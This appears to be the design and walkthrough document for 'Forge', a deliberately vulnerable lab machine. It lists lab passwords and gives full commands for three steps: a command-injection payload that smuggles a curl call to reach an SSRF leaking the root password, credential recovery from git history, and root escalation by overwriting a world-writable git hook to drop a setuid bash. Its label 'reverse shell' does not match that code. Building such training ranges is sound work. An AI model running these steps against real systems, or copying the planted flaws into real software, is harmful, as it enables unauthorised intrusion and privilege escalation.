# Forge

> A forge to develop new software for Sunspire. Forge is the manufacturing facility responsible for producing solar panel components and sustainable materials.

---

## Overview

| Property | Value |
|----------|-------|
| Difficulty | Medium |
| OS | Ubuntu 24.04 |
| Services | SSH, HTTP (Nginx), API |
| Initial Access | SSRF from Starfall, Git History Password Leak |
| Privilege Escalation | World-Writable Git Pre-Commit Hook |
| Lateral Movement | forge → pyre (password reuse) |

---

## Users

| Username | Password | Notes |
|----------|----------|-------|
| forge | h1ewFWZG | Same password as pyre user |
| ops | 9ksP311p | Standard ops account |
| root | 7ZjXxjQB | Leaked via SSRF |

---

## Services

### OpenSSH Server (:22)
- Standard SSH service for remote access
- Password authentication enabled

### Nginx Git Server (:80)
- Serves Git repositories via HTTP (dumb protocol)
- Repository: `/var/lib/git/forge-logs.git`
- Clone URL: `http://<target_ip>/git/forge-logs.git`

### Forge Manufacturing API (:4000)
- Flask application for manufacturing control
- Location: `/root/forge-api`
- Systemd service: `forge-api.service`

---

## API Endpoints

| Endpoint | Auth | Description |
|----------|------|-------------|
| `/` | No | API index with facility status |
| `/api/status` | No | Current production status |
| `/api/materials` | No | Raw materials inventory |
| `/api/jobs` | No | Active manufacturing jobs |
| `/api/info` | Yes | System information (leaks ROOT_PASSWORD) |

### Authentication for `/api/info`

| Requirement | Value |
|-------------|-------|
| User-Agent Header | `STARFALLER` |
| Token Parameter | `ab5f4cad309` |

---

## Attack Vectors

### Initial Access

#### Option 1: SSRF from Starfall (Root Password)

The Starfall machine's internal API makes requests to Forge's `/api/info` endpoint. By exploiting the command injection on Starfall, you can trigger this SSRF and retrieve the root password.

1. From Starfall, exploit command injection to hit internal API:
   ```bash
   curl "http://<starfall_ip>:5000/api/health/history?file=;curl+http://127.0.0.1:5001/api/config/display?hostname=forge"
   ```

2. The internal API makes a request to Forge:
   ```
   GET http://<forge_ip>:4000/api/info?token=ab5f4cad309
   User-Agent: STARFALLER
   ```

3. Response includes environment variables:
   ```json
   {
     "environment": {
       "ROOT_PASSWORD": "7ZjXxjQB",
       ...
     }
   }
   ```

4. SSH directly as root:
   ```bash
   ssh root@<forge_ip>
   # Password: 7ZjXxjQB
   ```

#### Option 2: Git History Password Leak (Forge User)

A Git repository is exposed via HTTP containing manufacturing logs. The forge user password was accidentally committed then removed, but remains in git history.

1. Clone the repository:
   ```bash
   git clone http://<forge_ip>/git/forge-logs.git
   cd forge-logs
   ```

2. View commit history:
   ```bash
   git log --oneline
   ```
   Output:
   ```
   <hash5> Add .gitignore for config files
   <hash4> Update logs - December batch
   <hash3> Remove sensitive config - should not be in repo
   <hash2> Add system configuration backup
   <hash1> Initial commit - manufacturing logs
   ```

3. View the removed config file:
   ```bash
   git show <hash2>:config/system.conf
   ```
   Or view the diff:
   ```bash
   git log -p
   ```

4. Find credentials in `config/system.conf`:
   ```
   FORGE_USER=forge
   FORGE_USER_PASSWORD=h1ewFWZG
   ```

5. SSH as forge user:
   ```bash
   ssh forge@<forge_ip>
   # Password: h1ewFWZG
   ```

### Privilege Escalation

#### World-Writable Git Pre-Commit Hook

The `/home/forge/manufacturing-scripts` repository has a world-writable `.git/hooks/` directory. A root cron job runs `git commit` in this repository every 5 minutes, triggering the pre-commit hook as root.

1. Check the hooks directory:
   ```bash
   ls -la /home/forge/manufacturing-scripts/.git/hooks/
   # pre-commit has 777 permissions
   ```

2. Overwrite the pre-commit hook with a reverse shell:
   ```bash
   cat > /home/forge/manufacturing-scripts/.git/hooks/pre-commit << 'EOF'
   #!/bin/bash
   cp /bin/bash /tmp/rootbash
   chmod +s /tmp/rootbash
   EOF
   chmod +x /home/forge/manufacturing-scripts/.git/hooks/pre-commit
   ```

3. Create a file to trigger the commit:
   ```bash
   touch /home/forge/manufacturing-scripts/trigger.txt
   ```

4. Wait up to 5 minutes for the cron job, then:
   ```bash
   /tmp/rootbash -p
   ```

**Cron Job Details:**

| Schedule | Script | Purpose |
|----------|--------|---------|
| */5 * * * * | /usr/local/bin/forge-build.sh | Automated build - commits changes as root |

---

### Lateral Movement

#### forge → pyre (Password Reuse)

The `forge` user password (`h1ewFWZG`) is the same as the `pyre` user on the Pyre machine.

```bash
ssh pyre@<pyre_ip>
# Password: h1ewFWZG
```

---

## Scoring

### Services
- [ ] API (Forge Manufacturing API on :4000)
- [ ] SSH (OpenSSH)

### Control Files
- [ ] `/root/ctrl.txt`
- [ ] `/home/forge/ctrl.txt`

---

## File Locations

| Purpose | Path |
|---------|------|
| Forge API | /root/forge-api |
| API Environment | /root/forge-api/.env |
| Git HTTP Repository | /var/lib/git/forge-logs.git |
| Manufacturing Scripts | /home/forge/manufacturing-scripts |
| Pre-Commit Hook (Vuln) | /home/forge/manufacturing-scripts/.git/hooks/pre-commit |
| Build Cron Script | /usr/local/bin/forge-build.sh |
| Nginx Config | /etc/nginx/sites-available/git |

---

## Starfall Integration

For the SSRF attack to work, Starfall's `systems.json` must include Forge:

```json
{"hostname": "forge", "ip": "<FORGE_IP_ADDRESS>"}
```
